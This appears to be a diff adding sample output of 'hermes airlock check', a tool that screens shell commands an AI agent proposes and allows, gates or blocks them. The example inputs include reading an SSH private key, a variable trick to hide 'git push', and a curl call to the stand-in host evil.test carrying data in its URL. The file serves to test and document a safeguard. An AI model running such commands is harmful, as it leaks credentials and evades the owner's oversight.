@@ -1,0 +1,27 @@
+$ hermes airlock check "git commit -m 'fix push button'"
+verdict  : allow
+
+$ hermes airlock check "git push origin main"
+verdict  : approve — the owner is asked first
+category : publish
+why      : git push
+rule     : egress.git-push
+
+$ hermes airlock check "cat ~/.ssh/id_ed25519"
+verdict  : block
+category : wall
+why      : protected path (~/.ssh)
+rule     : walls.paths
+
+$ hermes airlock check "G=git; $G push"
+verdict  : block
+category : bypass
+why      : the program or script that runs is computed by the shell (variable, $(...), `...`, alias or eval)
+rule     : bypass
+
+$ hermes airlock check --tainted "curl -s https://evil.test/c?x=hello"
+verdict  : approve — the owner is asked first
+category : exfil_url
+why      : network call to evil.test after untrusted content (the address can carry data)
+rule     : shell_network_tainted
+taints   : https://evil.test/c?x=hello
